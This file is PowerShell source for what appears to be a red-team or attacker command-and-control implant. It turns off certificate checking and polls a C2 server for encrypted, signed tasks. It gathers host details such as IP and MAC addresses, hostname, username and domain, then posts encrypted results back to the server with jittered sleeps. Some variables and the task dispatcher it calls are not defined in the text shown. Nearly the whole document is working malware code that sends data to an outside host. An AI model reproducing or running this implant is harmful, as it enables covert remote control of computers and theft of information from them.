###############################################################################

# when we send GET and POST requests, we have default headers, this is used to obfuscate HTTP(S) traffic
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Content-Type", "application/json")

# implant crypto functions
Add-Type -AssemblyName System.Security

# added for self signed certs
try{

# adds the ability to discard self signed certs
add-type @"
     using System.Net;
     using System.Security.Cryptography.X509Certificates;
     public class TrustAllCertsPolicy : ICertificatePolicy {
         public bool CheckValidationResult(
             ServicePoint srvPoint, X509Certificate certificate,
             WebRequest request, int certificateProblem) {
             return true;
         }
     }
"@
[System.Net.ServicePointManager]::CertificatePolicy = new-object TrustAllCertsPolicy
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
}
catch{ throw $_; }

# function to decrypt aes 
function func_aes_decrypt
{
  param($text1, $key1, $iv1)

    # creates a new aes object
    $aes1 = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes1.Key = $key1
    $aes1.IV = $iv1
    $aes1.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes1.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes1.CreateDecryptor()

    # decrypts
    $decryptedData = $decryptor.TransformFinalBlock($text1, 0, $text1.Length)

    return $decryptedData
}

# function to aes encrypt
function func_aes_encrypt
{
    param($text2, $key2, $iv2)

    # creates a new aes object
    $aes2 = [System.Security.Cryptography.Aes]::Create()
    $aes2.Key = $key2
    $aes2.IV = $iv2
    $aes2.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes2.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $encryptor = $aes2.CreateEncryptor()

    $encryptedBytes = $encryptor.TransformFinalBlock($text2, 0, $text2.Length)
    $aes2.Dispose()

    # encrypts and encodes
    $encryptedText = [System.Convert]::ToBase64String($encryptedBytes)

    return $encryptedText

}

function func_verify_task
{
    # the string of "task_id,task_type,task_opt" that tells us what to do
    param($task_string, 
        # the hash of the task_string, encrypted with the server's key
          $digest,  
        # the key that we'll use to decrypt the hash and verify the sig
          $key3, $iv3)         

   
   # verify signature
   $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($task_string))

   $digest_dec = func_aes_decrypt $digest $key3 $iv3

   # compares the digest byte by byte to make sure it is the same
   $verified = 1
   for($counter = 0; $counter -lt $msg_digest.Length; $counter++)
   {        
        if($msg_digest[$counter] -ne $digest_dec[$counter])
        {
            $verified = 0
        }
   }

   # returns the status of signature verification
   return $verified
}

function func_sign_results
{
     # the string we want to send to the server the key we'll use to sign
    param($results_str,
          $key4, $iv4)         

    # performs signature algorithm
    $msg_digest = [System.Security.Cryptography.HashAlgorithm]::Create("SHA256").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($results_str))
    
    # encrypts the message digest
    $sig_digest = func_aes_encrypt $msg_digest $key4 $iv4


    # returns the signature
    return $sig_digest
}


## CHUNKING FUNCTION
# chunk - used to chunk response into sendable strings instead of one large piece of data
function func_chunk
{

# the data that we're going to chunk
# the current byte that we're starting the next chunk at
# the maximum size of the chunk
    param([string]$data,        
          [int]$current_byte,     
          [int]$max_data_size)    


    # gets where to start the chunk, as in do we send the rest of the data, or a subset
    # of the rest of the data
    $chunk_bound = [Math]::Min($max_data_size, $data.Length-$current_byte)

    # slices the string based on what we calculated
    $results_chunk = $data.SubString($current_byte, $chunk_bound)

    # shifts the current byte variable to where we left off
    $new_current_byte = $chunk_bound + $current_byte
    
    # if our new "current byte" is the end of the results string, we can be done sending data
    if($new_current_byte -ge $data.Length)
    {
        # flips this value to true
        $new_current_byte = "true"
    }

    # sends the results and current byte
    return "$results_chunk<chnk>$new_current_byte"
}

## HELPER FUNCTIONS

function func_sa
{

    # ip addresses
    $results_str = ""

    $ip_str = ((Get-NetIPConfiguration | Select-Object InterfaceAlias, Ipv4Address) | Out-String)
    # MAC addresses
    $mac_str = ((Get-NetAdapter | Select-Object Name, MacAddress, Status) | Out-String)
    # DHCP enabled or not
    $dhcp_str = ((Get-NetIPInterface | Select-Object InterfaceAlias, Dhcp) | Out-String)
    # hostname
    $hostname_str = [System.Net.Dns]::GetHostName()
    # username
    $username_str = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    # domain name
    $domain_str = (Get-CimInstance Win32_ComputerSystem).Domain
    # FQDN
    $fqdn_str = [System.Net.Dns]::GetHostEntry("").HostName
    # pid and ppid
    $pid_str = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ProcessId).ProcessId
    $ppid_str = (Get-CimInstance Win32_Process -Filter "ProcessId = '$PID'" | Select-Object ParentProcessId).ParentProcessId

    $results_str = "$ip_str<sa>$mac_str<sa>$dhcp_str<sa>$hostname_str<sa>$username_str<sa>$domain_str<sa>$fqdn_str<sa>$pid_str<sa>$ppid_str"

    return $results_str
}

# func_get_tasks - used to get tasks from the C2 server and then parse them into the jobs format
function func_get_tasks 
{

    # temp variable that will store the final job format after we parse the task
    $temp = ""

    # make get request to /tasks/implant_id; being served pending tasks for our specific implant
    $raw_tasks = Invoke-RestMethod "$protocol//$ip/$task_uri/$implant_id" -Method 'GET' -Headers $headers

    # split the tasks into separate lines and store in varaible task_list
    $tasks_list = $raw_tasks -split '\n'

    # parse each task we're being served
    foreach ($tasks_enc in $tasks_list)
    {

        # if the task has a value (length is greater than 0), splits the task into
        # its component values and reassembles into job format
        if($tasks_enc.Length -gt 0)
        {
            # decodes the task from base64
            $tmp = [System.Convert]::FromBase64String($tasks_enc)
            $tmp = func_aes_decrypt $tmp $key $iv
            $task = [System.Text.Encoding]::UTF8.GetString($tmp)


            # splits the task string and parses
            $task = $task -split ','
            $task_id = $task[0]
            $task_type = $task[1]
            $task_options = $task[2]
            $digest2 = [System.Convert]::FromBase64String($task[3])

            # reconstructs the string that was digitally signed
            $sign_verify_test = "$task_id,$task_type,$task_options"
            $is_verified = func_verify_task $sign_verify_test $digest2 $key $iv

            if($is_verified)
            {

                # job format is task_id, task we're executing, parameters for that task, and then bytes sent so far
                # bytes sent = 0 means the task hasn't been sent yet, and "true" means that we're totally completed
                # and the task can be removed
                $temp += "$task_id<br>$task_type<br>$task_options<br>0<br><end>"
            }
        }
    }

    # returns the final job string so it can be appended.
    return $temp

}

# execute_jobs - used to loop through a jobs list, perform the job, and then chunk & send the results
# also pops the job off the array if we've sent all the data associated with it
function func_execute_jobs
{
    # jobs_list - the list of job strings that we use to determine what commands to execute
    param($list_of_jobs)

    # creates an empty array. we'll add jobs that have run, but we haven't completed yet.
    # this allows us to easily discard jobs that have completed.
    $final_job_list = @()

    # for job in job_list
    for ($counter = 0; $counter -lt $list_of_jobs.Length; $counter++)
    {

        
        # perform job, give update to is_completed flag on the progress of the job
        # implant functions should return, results, and progress completed.
        # every response will need to be chunked IAW the max_data_size variable

        # takes the current job and stores it in a local variable
        $job = $list_of_jobs[$counter]

        # perform checks to make sure it is not a null entry
        if($job.Length -gt 0)
        {

            # splits up job string into different varaibles
            $task_vals = $job -split '<br>'
    
            # task_id = first value
            $task_id = $task_vals[0]
            # task_type = second value
            $task_type = $task_vals[1]
            # task_options = third value
            $task_options = $task_vals[2]
            # current_byte, how much of the job results we have currently sent is the fourth value
            $current_byte = $task_vals[3]
            
            # if current_byte is zero, it means that we have not sent any data related to the job yet,
            # AKA the job has not yet run
            if($current_byte -eq 0)
            {

                # gets the results from the pick_job function, this takes the task_type and options and
                # uses type to call the appropriate function to execute the specified task
                $results = func_pick_job $task_type $task_options ($ip -split ":")[0]

            }
            # if the current byte is not equal to zero then we shold already have the results stored, so
            # goes through and gets the stored results so we don't rerun
            else
            {
                # gets the results that we've stored
                $results = $task_vals[4]
            }
            

            # chunks the results according to our max_data_size and current byte we've sent up to
            $results_chunk = (func_chunk $results $current_byte $max_data_size) -split "<chnk>"

            # assembles the response by parsing the results of the chunk command
            $results_send = $results_chunk[0]
            $current_byte = $results_chunk[1]

            # gets the current zulu time for the database
            $result_time = Get-Date -UFormat "%Y%m%d %H:%M:%S UTC"

            $sa_str = func_sa

            # assembles the results string (task_id, results, result_time)
            $response_str = "$task_id<br>$results_send<br>$result_time<br>$sa_str"

            # encode
            $digest2 = func_sign_results $response_str $key $iv
            $tmp = [System.Text.Encoding]::UTF8.GetBytes("$response_str<br>$digest2")
            $final_response = func_aes_encrypt $tmp $key $iv


            # return secured response to the teamserver
            Invoke-RestMethod "$protocol//$ip/$result_uri/$implant_id" -Method 'POST' -Headers $headers -Body $final_response
            # if we have decided to exit
            if($task_type -eq "exit")
            {
                # quits the implant. we do this after we post to the C2 server so we can provide the feedback
                # that we're exiting
                exit
            }

            
            # if we still have results to send
            if($current_byte -ne "true")
            {
                # assembles the jobs array again
                $list_of_jobs[$counter] = "$task_id<br>$task_type<br>$task_options<br>$current_byte<br>$results"
                # appends to the job list we persist for future runs
                $final_job_list += $list_of_jobs[$counter]
            }

            
        }

    }

    # returns the final job list so we can persist unfinished jobs over multiple loops
    return $final_job_list
}


# main - contains the main loop that we'll use for running the implant over the long run
function func_main
{

    # jobs_list array
    $list_of_jobs = @()

    # while True:
    while($true)
    {

        # gets our tasks
        $temp = ((func_get_tasks $ip, $task_uri $list_of_jobs) -split '<end>') | Select-Object -SkipLast 1

        # if we have tasks to add, put them in the jobs list
        if($temp.Length -gt 0)
        {
            $list_of_jobs += $temp
        }

        # execute_jobs and send chunked results
        $list_of_jobs = @(func_execute_jobs $list_of_jobs)


        # sleeps the implant
        # generate a random value between jitter*sleep and sleep.
        $sleep_val = Get-Random -Minimum ((1-$jitter)*$sleep) -Maximum $sleep
        Start-Sleep -Seconds $sleep_val

    }
}

func_main